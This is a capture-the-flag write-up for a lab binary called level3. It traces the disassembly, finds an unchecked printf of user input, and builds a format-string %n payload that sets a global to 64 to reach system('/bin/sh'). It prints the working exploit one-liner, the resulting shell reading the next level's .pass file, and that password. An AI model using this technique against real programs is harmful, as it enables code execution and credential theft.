# Level3

We can see that we have an executable file, which waits for input when launched, and which repeats what we have entered.

```
$ ls
level3
$ ./level3
test
test
```

We can see that the main function does nothing but call the ``v`` function.

```
$ objdump -d level3
0804851a <main>:
 804851a:       55                      push   %ebp
 804851b:       89 e5                   mov    %esp,%ebp
 804851d:       83 e4 f0                and    $0xfffffff0,%esp
 8048520:       e8 7f ff ff ff          call   80484a4 <v>
 8048525:       c9                      leave
 8048526:       c3                      ret
 8048527:       90                      nop
 8048528:       90                      nop
 8048529:       90                      nop
 804852a:       90                      nop
 804852b:       90                      nop
 804852c:       90                      nop
 804852d:       90                      nop
 804852e:       90                      nop
 804852f:       90                      nop

080484a4 <v>:
 80484a4:       55                      push   %ebp
 80484a5:       89 e5                   mov    %esp,%ebp
 80484a7:       81 ec 18 02 00 00       sub    $0x218,%esp
 80484ad:       a1 60 98 04 08          mov    0x8049860,%eax
 80484b2:       89 44 24 08             mov    %eax,0x8(%esp)
 80484b6:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp)
 80484bd:       00
 80484be:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484c4:       89 04 24                mov    %eax,(%esp)
 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt>
 80484cc:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484d2:       89 04 24                mov    %eax,(%esp)
 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt>
 80484da:       a1 8c 98 04 08          mov    0x804988c,%eax
 80484df:       83 f8 40                cmp    $0x40,%eax
 80484e2:       75 34                   jne    8048518 <v+0x74>
 80484e4:       a1 80 98 04 08          mov    0x8049880,%eax
 80484e9:       89 c2                   mov    %eax,%edx
 80484eb:       b8 00 86 04 08          mov    $0x8048600,%eax
 80484f0:       89 54 24 0c             mov    %edx,0xc(%esp)
 80484f4:       c7 44 24 08 0c 00 00    movl   $0xc,0x8(%esp)
 80484fb:       00
 80484fc:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
 8048503:       00
 8048504:       89 04 24                mov    %eax,(%esp)
 8048507:       e8 a4 fe ff ff          call   80483b0 <fwrite@plt>
 804850c:       c7 04 24 0d 86 04 08    movl   $0x804860d,(%esp)
 8048513:       e8 a8 fe ff ff          call   80483c0 <system@plt>
 8048518:       c9                      leave
 8048519:       c3                      ret
```

The ``v`` function call ``system`` function.

```
 804850c:       c7 04 24 0d 86 04 08    movl   $0x804860d,(%esp)
 8048513:       e8 a8 fe ff ff          call   80483c0 <system@plt>
```

``system`` is called with ``/bin/sh``, you must ensure that ``system`` is called.

```
$ gdb ./level3
(gdb) b v
Breakpoint 1 at 0x80484ad
(gdb) r
Starting program: /home/user/level3/level3

Breakpoint 1, 0x080484ad in v ()
(gdb) x/s 0x804860d
0x804860d:       "/bin/sh"
```

We can see that a comparison is holding us back.
</br>
0x40 = 64
</br>
We need to set ``0x804988c`` to ``64``.

```
 80484da:       a1 8c 98 04 08          mov    0x804988c,%eax
 80484df:       83 f8 40                cmp    $0x40,%eax
 80484e2:       75 34                   jne    8048518 <v+0x74>
```

We can see that the program reserves (0x208) ``520 bytes`` for the buffer.
</br>
And ``fgets`` reads (0x200) ``512 bytes``.
</br>
So buffer overflow with ``fgets`` impossible.

```
 80484ad:       a1 60 98 04 08          mov    0x8049860,%eax
 80484b2:       89 44 24 08             mov    %eax,0x8(%esp)
 80484b6:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp)
 80484bd:       00
 80484be:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484c4:       89 04 24                mov    %eax,(%esp)
 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt>
```

However, we can use ``printf`` to write via ``%n``.
</br>
``%n`` writes ``the number of characters displayed`` on ``the stack``.
</br>
We can see that it uses what ``fgets`` retrieves and the ``same directly`` in ``printf`` ``without verification``.
</br>
We can use a ``Format String Vulnerability``.

```
 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt>
 80484cc:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484d2:       89 04 24                mov    %eax,(%esp)
 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt>
 80484da:       a1 8c 98 04 08          mov    0x804988c,%eax
 80484df:       83 f8 40                cmp    $0x40,%eax
```

We can see that ``the return value`` of ``fgets`` is stored in ``the 4th position`` on ``the stack``.
</br>
AAAA = 0x41414141

```
$ ./level3
AAAA.%p.%p.%p.%p.%p
AAAA.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e
```

All that remains is to write the address ``0x804988c to place it in the 4th position``,</br>
then ``fill in 60 characters to get 64``,
</br>
then use ``%4$n`` ``to write`` with ``%n`` on the ``4th address``.

```
$ (python -c 'print("\x8c\x98\x04\x08" + "A"*60 + "%4$n")'; cat) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
